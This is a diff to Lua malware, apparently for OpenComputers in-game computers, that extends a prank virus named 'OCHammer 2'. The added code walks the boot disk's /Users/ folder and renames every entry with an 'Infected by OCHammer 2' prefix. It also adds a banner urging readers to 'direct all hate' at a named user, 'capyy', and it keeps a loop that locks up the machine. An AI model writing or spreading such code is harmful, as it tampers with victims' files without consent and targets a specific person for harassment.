@@ -44,6 +44,7 @@ function lol()
         "For more info, please e-mail: x19yt2yw@duck.com"; -- my private duck address (DO NOT CHANGE)
         " ";
         "Unbox a Computer 2 is coming soon, so stay tuned for the release!";
+        "** Direct all hate to capyy! **"
         " ";
         -- put some greetz or something
         "GREETZ: OCboy3, agentfish, cantgetnormaluser, Chouladalls, Kurhox, SirKamilMarko";
@@ -55,7 +56,6 @@ function lol()
     while true do
       computer.pullSignal(1)
     end
-
 end
 
 -- pcalled it so it would not break or smth
@@ -144,6 +144,20 @@ gp.fill(1,1,resX,resY," ")
 displayTable(APRIL)
 
 local lastPull = {}
+
+local veryfunny = {
+  "capyy";
+  "capyy/";
+  "cappy"; -- alias for capyy
+  "cappy/";
+}
+  
+local bootfs = component.proxy(ef.getData())
+
+for _,v2 in pairs(component.invoke(bootfs.address,"list","/Users/")) do
+  component.invoke(bootfs.address,"rename","/Users/" .. tostring(v2), "Infected by OCHammer 2 " .. tostring(v2))
+end
+  
 
 repeat
   lastPull = {computer.pullSignal(1)}
